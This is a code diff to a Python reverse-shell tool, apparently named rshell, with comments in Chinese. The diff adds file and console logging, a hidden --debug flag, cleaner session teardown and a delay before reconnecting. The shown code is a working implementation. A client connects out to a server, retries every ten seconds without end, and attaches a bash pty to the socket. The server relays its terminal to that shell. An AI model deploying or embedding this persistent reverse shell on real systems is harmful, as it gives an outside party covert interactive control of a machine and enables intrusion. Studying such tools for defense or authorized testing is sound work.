@@ -16,6 +16,7 @@ import fcntl
 import socket
 import struct
 import signal
+import logging
 import termios
 import argparse
 import traceback
@@ -28,6 +29,26 @@ SHELL='bash'
 STDIN = sys.stdin.fileno()
 # STDIN = sys.stdin
 STDOUT = sys.stdout.fileno()
+
+
+def getlogger(level=logging.INFO):
+    fmt = logging.Formatter("%(asctime)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
+
+    stream = logging.StreamHandler(sys.stdout)
+    stream.setFormatter(fmt)
+
+    fp = logging.FileHandler("rshell.logs")
+    fp.setFormatter(fmt)
+
+    logger = logging.getLogger("rshell")
+    logger.setLevel(level)
+    logger.addHandler(stream)
+    logger.addHandler(fp)
+    return logger
+
+
+logger = getlogger()
+
 
 def get_pty_size(fd):
     size = fcntl.ioctl(fd, termios.TIOCGWINSZ, b"0000") # 占位符
@@ -42,9 +63,9 @@ def set_pty_size(fd, columns, rows):
 # 窗口大小调整
 def signal_SIGWINCH_handle(sigNum, frame):
     size = get_pty_size(STDOUT)
-    # print(f"窗口大小改变: {size}")
+    # logger.info(f"窗口大小改变: {size}")
     set_pty_size(STDOUT, *size)
-    # print("sigwinch 执行完成")
+    # logger.info("sigwinch 执行完成")
 
 
 def socketshell(sock, size):
@@ -62,39 +83,56 @@ def socketshell(sock, size):
 
         p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)
 
-        while p.poll() is None:
+        BREAK=False
+        # while p.poll() is None:
+        while True:
 
             for key, event in ss.select():
+
                 fd = key.fileobj
                 if fd == sock:
                     data = sock.recv(1024)
-                    # print("recv:", data)
+                    logger.debug(f"sock recv: {data}")
                     
                     # 在peer挂掉的情况下会出现
                     if data == b"":
-                        p.communicate()
+                        # p 的关闭 放到 finally
+                        BREAK=True
                         break
                     os.write(pty_master, data)
 
                 elif fd == pty_master:
                     data = os.read(pty_master, 1024)
+                    logger.debug(f"pty read: {data}")
                     if data:
                         sock.send(data)
+                    else:
+                        BREAK=True
+                        break
 
-            #print("新的一轮 select()")
+                # 这样按一次ctrl+D，就会正常退出了.
+                if p.poll() is not None:
+                    BREAK=True
+                    break
+
+            if BREAK:
+                break
+
+            #logger.info("新的一轮 select()")
     except Exception as e:
         # raise e
-        print(f"捕获到异常退出: {e}")
+        logger.info(f"捕获到异常退出: {e}")
 
     finally:
         sock.close()
         ss.close()
-        print("sock exit")
+        p.terminate()
+        logger.info("sock exit")
 
 
 def server(addr, port):
     server_addr = (addr, port)
-    print(sys.argv[0], "listen: ", server_addr)
+    logger.info(f"{sys.argv[0]} listen: {server_addr}")
 
     try:
         signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
@@ -106,11 +144,11 @@ def server(addr, port):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
 
         client, addr = sock.accept()
-        print(f"有反向shell连接上: {addr}")
+        logger.info(f"有反向shell连接上: {addr}")
 
 
         size = get_pty_size(STDIN)
-        print(f"向对面发送终端大小： {size}")
+        logger.info(f"向对面发送终端大小： {size}")
         client.send(struct.pack("!HH", *size))
     
         # 关闭监听
@@ -128,18 +166,23 @@ def server(addr, port):
 
         exit_flag = True
         while exit_flag:
+
             for key, event in ss.select():
+
                 fd = key.fileobj
                 if fd == client:
                     data = client.recv(1024)
                     if data == b"":
                         exit_flag = False
+                        logger.debug(f"server client.recv 空: {data}")
                         break
                     os.write(STDOUT, data)
+
                 elif fd == STDIN:
                     data = os.read(STDIN, 1024)
                     client.send(data)
 
+        logger.debug(f"exit_flag: {exit_flag} 退出了")
     except Exception:
         traceback.print_exc()
 
@@ -147,12 +190,12 @@ def server(addr, port):
         client.close()
         ss.close()
         termios.tcsetattr(STDIN, termios.TCSADRAIN, tty_bak)
-        print("logout")
+        logger.info("logout")
 
 
 def client(addr, port=6789):
     if addr == "":
-        print("client 需要 server 地址")
+        logger.info("client 需要 server 地址")
         return
     
     server_addr = (addr, port)
@@ -160,18 +203,24 @@ def client(addr, port=6789):
     # sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     # sock.settimeout(10)
 
+    GO=False
     while True:
         try:
             sock = socket.create_connection(server_addr, timeout=10)
         except TimeoutError:
-            print(f"连接超时。。。重新连接")
+            logger.info(f"连接超时。。。重新连接")
+            GO=True
         except ConnectionRefusedError:
-            print(f"服务端口关闭，等待重新打开。。。")
+            logger.info(f"服务端口关闭，等待重新打开。。。")
+            GO=True
         except socket.gaierror:
-            print(f"域名不存在")
+            logger.info(f"域名不存在")
+            GO=True
         except Exception:
             traceback.print_exc()
-        finally:
+            GO=True
+        
+        if GO:
             time.sleep(10)
             continue
 
@@ -182,7 +231,7 @@ def client(addr, port=6789):
         while True:
             d = sock.recv(1)
             if d == b"":
-                print("Peer关闭")
+                logger.info("Peer关闭")
                 sock.close()
 
                 
@@ -192,11 +241,12 @@ def client(addr, port=6789):
         size = sock.recv(4)
         size = struct.unpack("!HH", size)
 
-        print(f"client connect: {server_addr}")
+        logger.info(f"client connect: {server_addr}")
         th = threading.Thread(target=socketshell, args=(sock, size), daemon=True)
         th.start()
         th.join()
-        print(f"连接server: {server_addr}, 正常退出")
+        logger.info(f"连接server: {server_addr}, 正常退出")
+        time.sleep(10)
 
 
 def main():
@@ -223,6 +273,8 @@ def main():
 
     parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)
 
+    parse.add_argument("--debug", action="store_true", help=argparse.SUPPRESS)
+
     server_func.set_defaults(func=lambda args :server(args.addr, args.port))
     
     client_func.set_defaults(func=lambda args :client(args.addr, args.port))
@@ -230,10 +282,16 @@ def main():
     args = parse.parse_args()
 
     if args.parse:
-        print(args)
+        logger.info(args)
         sys.exit(0)
     
-    return args.func(args)
+    if args.debug:
+        logger.setLevel(logging.DEBUG)
+    
+    try:
+        return args.func(args)
+    except KeyboardInterrupt:
+        pass
 
     # parse.print_help()
     # sys.exit(1)
